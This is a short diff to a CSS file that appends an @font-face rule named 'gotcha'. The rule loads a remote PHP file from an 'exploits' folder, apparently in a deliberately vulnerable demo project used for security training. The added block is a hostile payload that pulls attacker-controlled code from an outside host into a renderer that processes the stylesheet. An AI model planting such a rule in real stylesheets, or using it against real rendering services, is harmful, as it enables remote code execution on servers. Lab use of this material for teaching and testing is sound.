@@ -2,3 +2,9 @@ b {
   color: red;
   font-size: 144px;
 }
+@font-face {
+    font-family:'gotcha';
+    src:url('https://github.com/snyk-labs/php-goof/blob/main/exploits/gotcha_font.php?raw=true');
+    font-weight:'normal';
+    font-style:'normal';
+  }
